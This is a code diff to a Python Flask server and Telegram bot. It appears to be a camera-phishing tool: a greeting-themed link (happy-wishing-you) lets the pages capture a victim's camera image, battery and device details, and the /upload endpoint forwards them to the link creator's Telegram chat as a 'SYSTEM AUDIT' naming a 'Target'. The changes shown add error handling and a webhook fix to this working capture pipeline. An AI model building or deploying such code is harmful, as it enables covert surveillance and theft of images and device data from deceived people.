@@ -1,4 +1,4 @@
-import os, base64, threading, sqlite3
+import os, base64, threading, sqlite3, time
 from flask import Flask, render_template, request, jsonify
 import telebot
 from telebot import types
@@ -6,8 +6,12 @@ from telebot import types
 app = Flask(__name__)
 BOT_TOKEN = os.getenv('BOT_TOKEN')
 ADMIN_ID = 7162565886 
-MY_CHAT_ID = "7162565886" # Default ID
+MY_CHAT_ID = "7162565886"
 bot = telebot.TeleBot(BOT_TOKEN)
+
+# Error 409 फिक्स करने के लिए वेबहुक डिलीट करना
+bot.remove_webhook()
+time.sleep(1)
 
 def init_db():
     conn = sqlite3.connect('users.db')
@@ -35,7 +39,7 @@ def start(message):
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
-    base_url = "https://happy-wishing-you.onrender.com" # Check your URL
+    base_url = "https://happy-wishing-you.onrender.com" 
     user_id = call.message.chat.id
     
     if call.data == "cam_menu":
@@ -73,18 +77,22 @@ def index():
 @app.route('/upload', methods=['POST'])
 def upload():
     data = request.json
-    target_id = data.get('uid', MY_CHAT_ID) # Jo link banayega usko jayega
+    target_id = data.get('uid', MY_CHAT_ID)
     branding = "<b>━━━━━━━━━━━━━━━━━━━━━━\n✨ Created by Roshan Ali ✨\n━━━━━━━━━━━━━━━━━━━━━━</b>"
     report = (f"🛡️ <b>SYSTEM AUDIT: {data.get('label')}</b>\n👤 <b>Target:</b> {data.get('name')}\n"
               f"🔋 <b>Battery:</b> {data.get('info').get('battery')}\n📱 <b>Device:</b> {data.get('info').get('platform')}\n\n{branding}")
     
     if data.get('image'):
-        img_bytes = base64.b64decode(data.get('image').split(',')[1])
-        bot.send_photo(target_id, img_bytes, caption=report, parse_mode='HTML')
+        try:
+            img_bytes = base64.b64decode(data.get('image').split(',')[1])
+            bot.send_photo(target_id, img_bytes, caption=report, parse_mode='HTML')
+        except Exception as e:
+            print(f"Upload error: {e}")
     return jsonify({"status": "success"})
 
 if __name__ == "__main__":
     init_db()
-    threading.Thread(target=lambda: bot.polling(none_stop=True)).start()
+    # बॉट को अलग थ्रेड में चलाना
+    threading.Thread(target=lambda: bot.polling(none_stop=True, timeout=60)).start()
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
     
